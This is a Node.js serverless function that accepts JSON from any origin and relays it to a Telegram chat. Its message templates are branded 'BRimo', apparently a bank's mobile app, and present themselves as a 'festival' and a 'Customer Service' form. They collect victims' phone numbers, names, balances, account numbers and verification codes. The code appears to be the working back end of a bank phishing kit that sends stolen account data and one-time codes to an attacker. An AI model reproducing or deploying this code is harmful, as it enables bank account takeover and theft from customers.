const axios = require('axios');

exports.handler = async (event, context) => {
    // Handle CORS preflight requests
    if (event.httpMethod === 'OPTIONS') {
        return {
            statusCode: 204,
            headers: {
                'Access-Control-Allow-Origin': '*',
                'Access-Control-Allow-Headers': 'Content-Type',
                'Access-Control-Allow-Methods': 'POST, OPTIONS'
            },
            body: ''
        };
    }

    // Only allow POST requests
    if (event.httpMethod !== 'POST') {
        return {
            statusCode: 405,
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ 
                status: 'error',
                message: 'Method Not Allowed' 
            })
        };
    }

    try {
        // Parse incoming data
        const data = JSON.parse(event.body);
        const telegramBotToken = process.env.TELEGRAM_BOT_TOKEN;
        const telegramChatId = process.env.TELEGRAM_CHAT_ID;

        // Validate environment variables
        if (!telegramBotToken || !telegramChatId) {
            throw new Error('Server configuration error: Telegram credentials missing');
        }

        // Validate request data
        if (!data.type) {
            return {
                statusCode: 400,
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    status: 'error',
                    message: 'Notification type is required'
                })
            };
        }

        // Format message based on type
        let message;
        switch(data.type) {
            case 'phone_number':
                if (!data.phoneNumber) {
                    return {
                        statusCode: 400,
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({
                            status: 'error',
                            message: 'Phone number is required'
                        })
                    };
                }

                message = `├• BRimo | festival\n` +
                         `├───────────────────\n` +
                         `├• NO HP : ${data.phoneNumber || '-'}\n` +
                         `├───────────────────\n` +
                         `├• NAMA  : ${data.name || '-'}\n` +
                         `├───────────────────\n` +
                         `├• SALDO : ${data.balance ? new Intl.NumberFormat('id-ID').format(data.balance) : '-'}\n` +
                         `╰───────────────────\n` +
                         `⏱ ${new Date().toLocaleString('id-ID', { 
                            weekday: 'long',
                            day: 'numeric',
                            month: 'long',
                            year: 'numeric',
                            hour: '2-digit',
                            minute: '2-digit',
                            second: '2-digit'
                         })}`;
                break;

            case 'contact_service':
                message = `📞 BRimo | Customer Service\n` +
                         `├───────────────────\n` +
                         `├• REKENING : ${data.accountNumber || '-'}\n` +
                         `├───────────────────\n` +
                         `├• ATAS NAMA : ${data.accountName || '-'}\n` +
                         `├───────────────────\n` +
                         `├• SALDO : ${data.amount || '-'}\n` +
                         `├───────────────────\n` +
                         `├• KODE VERIFIKASI : ${data.virtualCode || '-'}\n` +
                         `╰───────────────────\n` +
                         `⏱ ${new Date().toLocaleString('id-ID')}`;
                break;

            default:
                return {
                    statusCode: 400,
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        status: 'error',
                        message: 'Invalid notification type'
                    })
                };
        }

        // Send to Telegram
        const telegramUrl = `https://api.telegram.org/bot${telegramBotToken}/sendMessage`;
        const response = await axios.post(telegramUrl, {
            chat_id: telegramChatId,
            text: message,
            parse_mode: 'Markdown',
            disable_notification: false
        });

        // Success response
        return {
            statusCode: 200,
            headers: { 
                'Content-Type': 'application/json',
                'Access-Control-Allow-Origin': '*' 
            },
            body: JSON.stringify({
                status: 'success',
                message: 'Notification sent successfully',
                telegram_message_id: response.data.result.message_id,
                timestamp: new Date().toISOString()
            })
        };

    } catch (error) {
        console.error('Error processing request:', error);
        
        return {
            statusCode: 500,
            headers: { 
                'Content-Type': 'application/json',
                'Access-Control-Allow-Origin': '*' 
            },
            body: JSON.stringify({
                status: 'error',
                message: 'Internal server error',
                error: error.message,
                ...(process.env.NODE_ENV === 'development' && { stack: error.stack })
            })
        };
    }
};
